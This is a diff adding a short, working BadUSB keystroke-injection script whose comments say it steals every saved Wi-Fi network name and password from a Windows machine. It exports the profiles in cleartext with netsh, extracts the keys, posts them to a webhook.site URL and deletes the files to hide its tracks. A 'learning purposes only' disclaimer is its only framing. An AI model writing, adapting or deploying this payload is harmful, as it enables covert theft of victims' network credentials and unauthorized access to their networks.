@@ -1,0 +1,32 @@
+REM This is the code for stealing all registered WiFi names and Passworeds and posting them remotly to WebHook
+REM This Code is only for Learning Purposes  and I'm Not responsible for any illegal uses 
+GUI r
+DELAY 300
+STRING cmd /k mode con: cols=15 lines=1
+DELAY 300
+ENTER
+DELAY 500
+STRING cd %temp%
+DELAY 300
+ENTER
+DELAY 500
+STRING netsh wlan export profile key=clear
+DELAY 300
+ENTER
+DELAY 500
+STRING powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS
+DELAY 300
+ENTER
+DELAY 500
+REM Below this is the site that you will get your stolen passwoerd at you can get your own ID form Webhook site delete the parentheses
+STRING powershell Invoke-WebRequest -Uri https://webhook.site/(Your ID here) -Method POST -InFile Wi-Fi-PASS
+DELAY 300
+ENTER
+DELAY 1000
+STRING del Wi-* /s /f /q
+DELAY 300
+ENTER
+DELAY 300
+STRING exit
+DELAY 100
+ENTER
